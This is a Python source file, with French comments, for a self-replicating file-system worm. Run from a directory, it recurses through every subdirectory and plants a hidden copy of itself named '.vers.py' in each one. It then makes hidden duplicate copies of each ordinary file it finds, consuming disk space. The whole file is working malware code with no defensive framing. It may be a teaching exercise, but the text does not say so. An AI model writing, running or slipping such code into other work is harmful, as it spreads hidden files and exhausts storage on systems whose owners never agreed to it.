import os 
import shutil

class Worm: 

    #initilisation et replication
    def __init__(self, path=None, target_dir_list=None, iteration=None): 
        if isinstance(path, type(None)): 
            self.path = "/" 
        else: self.path = path 

        if isinstance(target_dir_list, type(None)): 
            self.target_dir_list = [] 
        else: self.target_dir_list = target_dir_list 
        
        if isinstance(target_dir_list, type(None)): 
            self.iteration = 2 
        else: 
            self.iteration = iteration
        
        # get own absolute path 
        self.own_path = os.path.realpath(__file__)
    
    #analyse du système
    def list_directories(self,path): 
        self.target_dir_list.append(path) 
        files_in_current_directory = os.listdir(path) 
        
        
        for file in files_in_current_directory: 
            # avoid hidden files/directories (start with dot (.)) 
            if not file.startswith('.'): 
                #get the full path 
                absolute_path = os.path.join(path, file) 
                print(absolute_path) 
                
                if os.path.isdir(absolute_path): 
                    self.list_directories(absolute_path) 
                else: 
                    pass
    
    #methode pour repliquer le ver 
    def create_new_worm(self): 
        for directory in self.target_dir_list:
            if directory == "main.py" or directory =="vers.py" or directory =="virus.py":
                    continue
            else :
                destination = os.path.join(directory, ".vers.py")
                # copy the script in the new directory with similar name
                shutil.copyfile(self.own_path, destination)
    
    #methode pour copier les fichiers existants
    def copy_existing_files(self):
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                if file == "main.py" or file =="vers.py" or file =="virus.py":
                    continue
                else :
                    abs_path = os.path.join(directory, file)
                    if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                        source = abs_path
                        for i in range(self.iteration):
                            destination = os.path.join(directory,("."+file+str(i)))
                            shutil.copyfile(source, destination)
   
    #methode pour appeler/integer pour les fonctions
    def start_worm_actions(self):
        self.list_directories(self.path)
        print(self.target_dir_list)
        self.create_new_worm()
        self.copy_existing_files()
    

#fonction principale
if __name__=="__main__":
    current_directory = os.path.abspath("")
    worm = Worm(path=current_directory)
    worm.start_worm_actions()